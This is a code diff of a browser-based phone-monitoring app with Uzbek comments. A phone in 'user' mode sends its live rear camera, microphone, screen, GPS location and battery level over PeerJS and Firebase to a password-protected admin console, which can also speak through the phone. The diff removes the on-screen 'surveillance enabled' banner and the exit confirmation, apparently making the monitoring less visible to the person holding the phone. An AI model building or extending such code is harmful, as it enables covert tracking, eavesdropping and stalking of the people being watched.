@@ -22,6 +22,17 @@ let isTalking = false;
 let map = null;
 let marker = null;
 
+// --- LOG TIZIMI (Xatolarni Firebase orqali Adminga yuborish) ---
+function sendLog(msg) {
+    const id = peer ? peer.id : 'no-id';
+    db.ref('devices/' + id + '/logs').push({
+        time: new Date().toLocaleTimeString(),
+        message: msg
+    });
+}
+
+window.onerror = (m, u, l) => sendLog(`Xato: ${m} | Qator: ${l}`);
+
 // SAHIFA YUKLANGANDA
 window.onload = () => {
     const role = localStorage.getItem('myRTC_role');
@@ -31,27 +42,14 @@ window.onload = () => {
 };
 
 function goHome() {
-    if (confirm("Chiqishni xohlaysizmi?")) {
-        localStorage.clear();
-        window.location.reload();
-    }
+    localStorage.clear();
+    window.location.reload();
 }
 
-// QURILMA MODELINI TO'G'RI ANIQLASH (Sizda 'aas' chiqmasligi uchun)
-function getDetailedModel() {
-    const ua = navigator.userAgent;
-    if (/android/i.test(ua)) {
-        const match = ua.match(/\(([^;]+);([^;]+);/);
-        return match ? match[2].trim() : "Android_Phone";
-    }
-    return (ua.indexOf("Linux") !== -1) ? "Linux_PC" : "Device";
-}
-
-// --- USER MODE (TELEFON UCHUN) ---
+// --- USER MODE (TELEFON) ---
 async function openUser() {
-    let name = prompt("Ismingizni kiriting:");
+    let name = prompt("Ismingiz:");
     if (!name) return;
-    name = name + "(" + getDetailedModel() + ")";
     localStorage.setItem('myRTC_role', 'user');
     localStorage.setItem('myRTC_deviceName', name);
     startUserLogic(name);
@@ -62,49 +60,55 @@ async function startUserLogic(deviceName) {
     peer = new Peer();
 
     peer.on('open', (id) => {
-        const ref = db.ref('devices/' + id);
-        ref.set({ name: deviceName, status: 'online' });
-        ref.onDisconnect().remove();
-
-        // GPS va Batareya (Sizda bular to'g'ri ishlayapti)
+        db.ref('devices/' + id).set({ name: deviceName, status: 'online' });
+        db.ref('devices/' + id).onDisconnect().remove();
+        sendLog("Telefon onlayn. ID: " + id);
+        
+        // GPS
         navigator.geolocation.watchPosition(p => {
             db.ref('devices/' + id + '/location').set({
-                lat: p.coords.latitude, lng: p.coords.longitude, time: new Date().toLocaleTimeString()
+                lat: p.coords.latitude, lng: p.coords.longitude
             });
-        }, null, { enableHighAccuracy: true });
+        }, e => sendLog("GPS xatosi: " + e.message));
+
+        // Batareya
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                const upd = () => db.ref('devices/' + id + '/info').update({ battery: Math.floor(b.level * 100) + "%" });
+                upd(); b.onlevelchange = upd;
+            });
+        }
     });
 
     try {
-        // MUHIM: Mobil telefonda kamera va mikrofonga ruxsat olish
+        // Kamerani olish (Ideal sozlamalar bilan)
         localStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "environment" }, // Orqa kamera
+            video: { facingMode: { ideal: "environment" } }, 
             audio: true 
         });
+        sendLog("Kamera va mikrofon tayyor.");
 
         peer.on('call', async (call) => {
-            // Agar admin ekran so'rasa
+            sendLog("Admin ulandi...");
             if (call.metadata && call.metadata.type === 'getScreen') {
-                try {
-                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    call.answer(screenStream);
-                } catch (e) { console.error("Ekran ruxsati berilmadi"); }
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                call.answer(screenStream);
+                sendLog("Ekran uzatish boshlandi.");
             } else {
-                // Kamera va ovoz qo'ng'irog'iga javob berish
                 call.answer(localStream);
-                call.on('stream', (remoteStream) => {
-                    // Admin ovozini eshitish uchun (Speaker)
-                    const audio = new Audio();
-                    audio.srcObject = remoteStream;
-                    audio.play().catch(e => console.log("Ovoz avto-play bloklandi"));
+                // Admin ovozini eshitish
+                call.on('stream', s => {
+                    const a = new Audio(); a.srcObject = s; a.play();
                 });
             }
         });
-
-        document.body.innerHTML = '<div style="background:white; height:100vh; display:flex; align-items:center; justify-content:center;"><h1>KUZATUV YOQILDI</h1><button onclick="goHome()" style="position:fixed; top:20px; left:20px; padding:10px;">Chiqish</button></div>';
-    } catch (e) { alert("Kamera/Mikrofon ruxsati berilmadi!"); }
+    } catch (e) {
+        sendLog("Media xatosi: " + e.message);
+        alert("Ruxsat berilmadi!");
+    }
 }
 
-// --- ADMIN MODE (KOMPYUTER UCHUN) ---
+// --- ADMIN MODE (KOMPYUTER) ---
 function openAdmin(auto = false) {
     if (!auto && prompt("Parol:") !== adminPass) return;
     localStorage.setItem('myRTC_role', 'admin');
@@ -119,6 +123,7 @@ function openAdmin(auto = false) {
         list.innerHTML = "";
         snap.forEach(child => {
             const btn = document.createElement('button');
+            btn.className = "btn-user-select";
             btn.innerText = child.val().name;
             btn.onclick = () => connectToDevice(child.key, child.val().name);
             list.appendChild(btn);
@@ -128,47 +133,40 @@ function openAdmin(auto = false) {
 
 function connectToDevice(id, name) {
     if (currentActiveCallId) {
-        db.ref('devices/' + currentActiveCallId + '/info').off();
+        db.ref('devices/' + currentActiveCallId + '/logs').off();
         db.ref('devices/' + currentActiveCallId + '/location').off();
     }
     currentActiveCallId = id;
     document.getElementById('target-name').innerText = "Qurilma: " + name;
 
-    // Batareya va GPS yangilash (Sizning kodingizdan olindi)
-    db.ref('devices/' + id + '/info').on('value', s => {
-        const i = s.val();
-        if (i) document.getElementById('battery-display').innerText = `Quvvat: ${i.battery} ${i.charging ? '(⚡)' : ''}`;
+    // Loglarni ko'rsatish
+    const logBox = document.getElementById('console-logs');
+    logBox.innerHTML = "";
+    db.ref('devices/' + id + '/logs').limitToLast(10).on('child_added', s => {
+        const p = document.createElement('div');
+        p.innerText = `> [${s.val().time}] ${s.val().message}`;
+        logBox.prepend(p);
     });
 
+    // GPS
     db.ref('devices/' + id + '/location').on('value', s => {
-        const l = s.val();
-        if (l) {
-            document.getElementById('location-display').innerText = `Kordinata: ${l.lat}, ${l.lng} (${l.time})`;
-            initLeafletMap(l.lat, l.lng); // index.html dagi Leaflet ishlatiladi
-        }
+        if (s.val()) initMap(s.val().lat, s.val().lng);
     });
 
-    // KAMERANI KO'RISH
+    // 1. Kamera ulanishi
     const videoCall = adminPeer.call(id, null);
     videoCall.on('stream', s => {
         document.getElementById('remoteVideo').srcObject = s;
     });
 
-    // EKRANNI KO'RISH (3-oyna uchun so'rov)
+    // 2. Ekran ulanishi
     const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
     screenCall.on('stream', s => {
-        const screenVideo = document.getElementById('screenVideo') || document.getElementsByClassName('placeholder-text')[0];
-        if (screenVideo.tagName === 'VIDEO') {
-            screenVideo.srcObject = s;
-        } else {
-            // Agar video elementi bo'lmasa, o'rniga dinamik yaratamiz
-            screenVideo.innerHTML = '<video id="screenVideo" autoplay playsinline style="width:100%; height:100%;"></video>';
-            document.getElementById('screenVideo').srcObject = s;
-        }
+        document.getElementById('screenVideo').srcObject = s;
     });
 }
 
-function initLeafletMap(lat, lng) {
+function initMap(lat, lng) {
     if (!map) {
         map = L.map('map').setView([lat, lng], 16);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
@@ -180,11 +178,11 @@ async function toggleTalk() {
     const btn = document.getElementById('talkBtn');
     if (!isTalking) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            adminPeer.call(currentActiveCallId, stream);
+            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+            adminPeer.call(currentActiveCallId, s);
             isTalking = true; btn.innerText = "GAPIRILMOQDA..."; btn.style.background = "red";
         } catch (e) { alert("Mikrofon xatosi!"); }
     } else {
-        window.location.reload(); // Oddiyroq yo'li
+        window.location.reload();
     }
 }
